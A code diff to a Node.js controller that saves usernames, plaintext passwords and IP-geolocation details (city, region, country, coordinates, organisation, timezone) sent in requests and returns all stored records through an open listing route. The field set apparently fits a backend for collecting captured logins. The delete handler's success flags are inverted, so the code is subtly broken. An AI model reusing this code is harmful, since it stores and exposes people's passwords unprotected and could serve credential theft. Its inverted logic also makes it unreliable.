@@ -1,44 +1,47 @@
-let det = require("../models/details.js");
+let Details = require("../models/details.js");
 exports.addToDetails = async (req, res) => {
-  const {
-    password,
-    ip,
-    city,
-    country,
-    loc,
-    org,
-    date,
-    username,
-    region,
-    timezone,
-  } = req.body;
-
-  det.push({
-    username,
-    password,
-    ip,
-    country,
-    city,
-    loc,
-    date,
-    org,
-    region,
-    timezone,
+  const details = new Details({
+    username: req.body.username,
+    password: req.body.password,
+    ip: req.body.ip,
+    country: req.body.country,
+    city: req.body.city,
+    loc: req.body.loc,
+    date: req.body.date,
+    region: req.body.region,
+    timezone: req.body.timezone,
+    org: req.body.org,
   });
-  await det.save();
-  // Return the detail object.
-  res.json(det);
+
+  await details.save();
+
+  res.json({
+    success: true,
+    message: "Details added successfully",
+  });
 };
 
 exports.getDetails = async (req, res) => {
-  res.json(det.details);
+  const details = await Details.find();
+
+  res.json({
+    success: true,
+    details: details,
+  });
 };
 exports.deleteDetail = async (req, res) => {
-  const detailIndex = req.query.index;
-  // Delete and return the details
-  if (detailIndex !== -1) {
-    det.details.splice(detailIndex, 1);
-    await det.save();
-    res.json(det.details);
+  const index = req.query.index;
+  try {
+    await Details.deleteOne({ _id: index });
+    res.json({
+      success: false,
+      message: "Details deleted successfully",
+      details: await Details.find(),
+    });
+  } catch (error) {
+    res.json({
+      success: true,
+      message: "Details not found",
+    });
   }
 };
